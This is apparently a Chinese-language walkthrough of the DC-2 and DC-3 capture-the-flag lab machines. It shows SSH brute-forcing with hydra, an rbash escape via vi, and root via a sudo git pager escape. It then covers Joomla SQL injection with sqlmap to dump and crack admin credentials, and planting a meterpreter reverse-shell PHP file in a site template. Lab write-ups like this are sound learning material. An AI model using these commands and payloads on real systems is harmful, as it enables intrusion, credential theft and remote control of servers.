<p>在page窗口发现flag2</p>
<p><img src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
<p>点开查看，得到flag2</p>
<p><img src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can<span class="symbol">&#x27;t</span> exploit WordPress <span class="keyword">and</span> take a shortcut, there <span class="keyword">is</span> another way.</span><br><span class="line"></span><br><span class="line">Hope you found another <span class="keyword">entry</span> point.</span><br><span class="line">意思是：</span><br><span class="line">如果你不能利用WordPress并走捷径，还有另一种方法。</span><br><span class="line"></span><br><span class="line">希望你能找到另一个切入点。 </span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据flag2的提示，实际上就是说从wordpress这条路是行不通的，要从另外的方向</p>
<p>但是如果wordpress行不通，而这个网站就是wordpress搭建起来的，那么这个网站的就不能下手</p>
<p>虽然网站的80端口的http行不通</p>
<p>但是我们之前用nmap扫了一下，发现端口7744运行着ssh，那我们能不能利用ssh登录成功呢</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个ssh的用户是谁</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">输入hydra -l un<span class="selector-class">.txt</span> -P pass<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">133.138</span> ssh -s <span class="number">7744</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
<p>发现<code>tom</code>账号是在这里登录</p>
<p><img src="/2022/08/29/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p>
<p>登录成功后，<code>ls</code>发现<code>flag3.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> flag3.txt，查看内容</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
<p>发现没有该命令，那就可能是没有权限执行这个命令了</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到rbash，不认识，查一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">rbash</span><br><span class="line">它与一般<span class="keyword">shell</span><span class="language-bash">的区别在于会限制一些行为，让一些命令无法执行</span></span><br></pre></td></tr></table></figure></div>

<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过ls，所以ls可以使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入ls <span class="regexp">/home/</span>tom<span class="regexp">/usr/</span>bin   <span class="regexp">//</span>查看rbash设置的可执行的命令</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
<p>我们可以看到我们可以利用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure></div>

<p>关键是vi的命令</p>
<h3 id="vi绕过-gt-rbash逃逸"><a href="#vi绕过-gt-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入vi中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">先输入<span class="keyword">vi</span>，进入<span class="keyword">vi</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
<p>然后</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">直接输入，不用按i</span><br><span class="line">:set shell=<span class="regexp">/bin/</span>sh    <span class="regexp">//</span>给shell赋值</span><br><span class="line">回车</span><br><span class="line">:shell                <span class="regexp">//</span>执行shell</span><br><span class="line">回车，就退回主界面来了</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
<p>这样我们就完成了逃逸</p>
<p>之前因为我们受限于rbash，不能执行cd等命令</p>
<p><img src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
<p>现在执行试试</p>
<p><img src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
<p>就没有阻止了</p>
<p>我们再试试cat</p>
<p><img src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
<p>发现cat命令找不到，但是我们已经绕过了rbash，所以只能是其他原因</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">这是显示当前环境变量，可能<span class="built_in">cat</span>并没有被设置到当前的环境变量所以无法执行</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
<h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="*设置全局变量"></a>*设置全局变量</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">于是我们来设置全局变量,终端输入</span><br><span class="line">export <span class="variable constant_">PATH</span>=<span class="variable constant_">PATH</span><span class="symbol">:/usr/local/sbin</span><span class="symbol">:/usr/local/bin</span><span class="symbol">:usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/bin</span><span class="symbol">:sbin</span></span><br></pre></td></tr></table></figure></div>

<p>这样我们执行cat就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> tom</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag3.txt</span><br><span class="line">得到flag3</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br><span class="line">意思是：</span><br><span class="line"><span class="section">可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">但是看到了su，也就是需要切换用户</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据flag3，我们可以知道需要用su命令切换用户到jerry</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">su</span> jerry和其密码</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
<p>然后切换到jerry目录，发现flag4.txt</p>
<p><img src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">Good <span class="keyword">to</span> see <span class="keyword">that</span> you&#x27;ve made <span class="keyword">it</span> this far - <span class="keyword">but</span> you&#x27;re <span class="keyword">not</span> home yet. </span><br><span class="line"></span><br><span class="line">You still need <span class="keyword">to</span> <span class="keyword">get</span> <span class="keyword">the</span> final flag (<span class="keyword">the</span> only flag <span class="keyword">that</span> really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re <span class="keyword">on</span> your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go <span class="keyword">on</span> - git outta here!!!!</span><br><span class="line">意思是：</span><br><span class="line">很高兴看到你走了这么远，但你还没回家。</span><br><span class="line">你仍然需要得到最后的标志（唯一真正重要的标志！！！）。</span><br><span class="line">这里没有提示-你现在只能靠自己了。：-）</span><br><span class="line">去吧-滚出去！！！！</span><br><span class="line"><span class="comment">--</span></span><br><span class="line">看到git，就是提示我们用git命令</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="regexp">//</span>列出目前用户可执行与无法执行的指令。</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>就可以发现root以nopasswd【不需要密码】运行git命令</u></p>
<p>原理是git存在缓存区溢出漏洞，</p>
<p>在使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure></div>

<p>不需要输入root密码，即可以root身份执行这条命令</p>
<p>操作如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure></div>

<p>下面可以看看区别</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h3><p>1.窗口足够大</p>
<p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>可以看到显示完了，就又回到原处了</p>
<p>2.窗口小一些</p>
<p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>下方就显示出:，等待输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure></div>

<h3 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h3><p>$变成#成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h3 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h3><p><img src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p>$变成#，成功登录</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
<p>然后到<code>/root</code>目录下，找到最后的 flag</p>
<p><img src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;s all greatly</span></span><br><span class="line"><span class="string">appreciated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">意思是：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">恭喜！！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">特别感谢所有给我发推文的人</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">并向我提供了反馈-非常棒</span></span><br><span class="line"><span class="string">谢谢。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果您喜欢这个CTF，请通过@DCAU7给我发一条推文</span></span><br></pre></td></tr></table></figure></div>

<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="三、DC-3-初级"><a href="#三、DC-3-初级" class="headerlink" title="三、DC-3[初级]"></a>三、DC-3[初级]</h1><p><strong>only one flag</strong></p>
<p>【前面的靶机ip寻找，按之前的步骤即可】</p>
<p>先用nmap扫一下我们的靶机ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
<p>看到只有<code>80</code>端口，运行着一个<code>http</code>服务，中间件为<code>apache2.4.18</code></p>
<p>内容管理系统（CMS）是<code>joomla</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
<p>利用插件<code>wappalyzer</code>，也可以看到其CMS为joomla</p>
<p>我们可以利用kali包当中自带的joomscan工具对其进行扫描</p>
<p>【没有的，可能需要更新包，然后直接下载即可】</p>
<p><img src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">输入joomscan -u <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p>
<p>扫描发现了，管理员的登录网址<code>http://192.168.133.139/administrator/</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p>
<p>但是不知道用户名和密码</p>
<hr>
<p>发现其<code>joomla</code>版本为<code>3.7.0</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p>
<p>但我们并不知道该版本有哪些漏洞，所以需要用到 <code>kali</code>的<code>Exploit-DB</code>工具</p>
<p>可以在浏览器里的<code>Exploit-DB</code>网址进行查询【不过因为是国外网址有点卡】</p>
<p><img src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
<p>然后寻找下载payload</p>
<hr>
<p>也可以在终端输入命令查询【也是基于Exploit-DB的命令行搜索工具,可以帮助我们查找渗透模块】</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">输入searchsploit <span class="keyword">joomla </span><span class="number">3</span>.<span class="number">7</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
<p>可以看到<code>joomla 3.7.0</code>版本存在<code>sql注入</code>的漏洞</p>
<p> 然后查看Path</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">输入searchsploit -<span class="selector-tag">p</span> <span class="number">42033</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
<p><code>Path</code>就是该漏洞利用方法的文本地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">42033</span>.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
<p>可以看到该漏洞的测试平台，时间，还有漏洞的CVE编号</p>
<p>关键在它给出的sqlmap注入的模板</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"><span class="comment">//把localhost改成靶机ip即可</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
<p>运行</p>
<p><img src="/2022/08/29/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p>
<p>发现了靶机下的数据库，我们所需要的就是<code>joomladb</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span><br><span class="line"></span><br><span class="line"><span class="comment">//在原有的payload后加上-D joomladb，选定数据库</span></span><br><span class="line"><span class="comment">//再在后面加上--tables，输出该数据库的表</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p>
<p>然后可以看到<code>#__users</code>的表，里面很可能有线索</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--random-agent</span> <span class="attr">--dbs</span> -<span class="selector-tag">p</span> list<span class="selector-attr">[fullordering]</span> -D joomladb -T <span class="string">&quot;#__users&quot;</span> <span class="attr">--columns</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//和上一步类似，但注意表名有#，所以需要用引号框起来，不然后面语句全被注释了</span></span><br><span class="line"><span class="comment">//*注，sqlmap提示按默认推荐就好</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p>
<p>看到<code>username</code>和<code>password</code>，查看列里内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</span><br><span class="line"><span class="comment">//dump获取字段中的数据</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p>
<p>得到用户名和密码</p>
<p>但是密码被加密了，那就只能用一些工具进行解密</p>
<p>先生成一个加密密码的文本文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">输入vi passwd.txt</span><br><span class="line">然后把加密数据复制进去</span><br><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>然后我们就需要用一个解密工具<code>john</code></p>
<p><code>John</code>是一个破解系统密码的工具</p>
<p>使用很简单</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入john --show passwd.txt<span class="regexp">//</span>后面接的是密码文本文件</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>得到密码<code>snoopy</code></p>
<p>然后登录后台网址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">用户名：<span class="literal">admin</span></span><br><span class="line">密码：snoopy</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p>
<p>登录成功，然后摸索分析一下网站</p>
<p>然后在<code>Extensions</code>–&gt;<code>Template</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p>
<p>发现有个<code>new file</code>，可以新建文件，那么我们也可以新建一个我们的木马文件，拿取靶机的<code>shell</code></p>
<h2 id="后门生成，进入shell"><a href="#后门生成，进入shell" class="headerlink" title="后门生成，进入shell"></a>后门生成，进入shell</h2><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><strong>msfvenom</strong></p>
<h4 id="msf生成木马"><a href="#msf生成木马" class="headerlink" title="msf生成木马"></a>msf生成木马</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kali的ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>注意，LHOST是kali的ip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">cat</span> <span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>得到靶机对应的木马</p>
<p>然后在网站新建一个php文件</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
<p>然后把木马内容导入进去</p>
<p><img src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p> 然后保存一下</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在`/templates/protostar/下上传的，所以访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
<p>看到/*，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用msf进行利用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">然后输入</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">进入我们利用msf制作的木马利用环境</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">看看需要填写什么</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>看到LHOST监听的ip没有填写</p>
